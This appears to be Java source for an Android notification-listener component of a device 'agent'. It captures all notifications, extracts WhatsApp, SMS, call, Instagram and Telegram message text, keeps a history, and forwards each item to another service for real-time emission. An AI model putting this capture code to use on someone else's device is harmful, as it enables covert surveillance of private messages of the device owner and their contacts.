package com.mydevice.agent;

import android.app.Notification;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.BitmapDrawable;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.List;

/**
 * Captures ALL notifications from the device (WhatsApp, calls, SMS, Instagram, etc.)
 * Requires user to manually enable in Settings > Notifications > Notification access
 */
public class NotificationService extends NotificationListenerService {

    private static final String TAG = "NotificationService";
    private static NotificationService instance;
    private static List<JSONObject> notificationHistory = new ArrayList<>();
    private static final int MAX_HISTORY = 500;

    public static NotificationService getInstance() {
        return instance;
    }

    public static List<JSONObject> getNotificationHistory() {
        return notificationHistory;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.d(TAG, "NotificationListenerService created");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;

            JSONObject notifData = new JSONObject();
            notifData.put("id", sbn.getId());
            notifData.put("packageName", sbn.getPackageName());
            notifData.put("timestamp", sbn.getPostTime());
            notifData.put("title", extras.getString(Notification.EXTRA_TITLE, ""));
            notifData.put("text", extras.getCharSequence(Notification.EXTRA_TEXT, "").toString());
            notifData.put("subText", extras.getCharSequence(Notification.EXTRA_SUB_TEXT, "").toString());

            // Get app name
            try {
                PackageManager pm = getPackageManager();
                String appName = pm.getApplicationLabel(
                    pm.getApplicationInfo(sbn.getPackageName(), 0)).toString();
                notifData.put("appName", appName);
            } catch (Exception e) {
                notifData.put("appName", sbn.getPackageName());
            }

            // Detect WhatsApp messages specially
            String pkg = sbn.getPackageName();
            if (pkg.equals("com.whatsapp") || pkg.equals("com.whatsapp.w4b")) {
                notifData.put("category", "whatsapp");
                // WhatsApp group messages have different format
                CharSequence bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
                if (bigText != null) {
                    notifData.put("fullText", bigText.toString());
                }
                // Get WhatsApp conversation messages if available
                CharSequence[] textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES);
                if (textLines != null) {
                    JSONArray lines = new JSONArray();
                    for (CharSequence line : textLines) {
                        lines.put(line.toString());
                    }
                    notifData.put("messages", lines);
                }
            } else if (pkg.equals("com.google.android.dialer") || pkg.contains("phone") || pkg.contains("dialer")) {
                notifData.put("category", "call");
            } else if (pkg.equals("com.google.android.apps.messaging") || pkg.contains("sms") || pkg.contains("mms")) {
                notifData.put("category", "sms");
            } else if (pkg.contains("instagram")) {
                notifData.put("category", "instagram");
            } else if (pkg.contains("telegram")) {
                notifData.put("category", "telegram");
            } else {
                notifData.put("category", "other");
            }

            // Get notification icon as base64 (small)
            try {
                Drawable appIcon = getPackageManager().getApplicationIcon(sbn.getPackageName());
                if (appIcon instanceof BitmapDrawable) {
                    Bitmap bmp = ((BitmapDrawable) appIcon).getBitmap();
                    Bitmap small = Bitmap.createScaledBitmap(bmp, 48, 48, true);
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    small.compress(Bitmap.CompressFormat.PNG, 70, baos);
                    notifData.put("icon", "data:image/png;base64," +
                        Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP));
                    small.recycle();
                }
            } catch (Exception e) {
                // Skip icon
            }

            // Store in history
            synchronized (notificationHistory) {
                notificationHistory.add(0, notifData);
                if (notificationHistory.size() > MAX_HISTORY) {
                    notificationHistory.remove(notificationHistory.size() - 1);
                }
            }

            // Forward to DeviceService for real-time emit
            if (DeviceService.isRunning && DeviceService.getInstance() != null) {
                DeviceService.getInstance().onNotificationReceived(notifData);
            }

            Log.d(TAG, "Notification captured: " + notifData.optString("appName") +
                " - " + notifData.optString("title"));

        } catch (Exception e) {
            Log.e(TAG, "Error processing notification: " + e.getMessage());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Optional: track dismissed notifications
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
    }
}
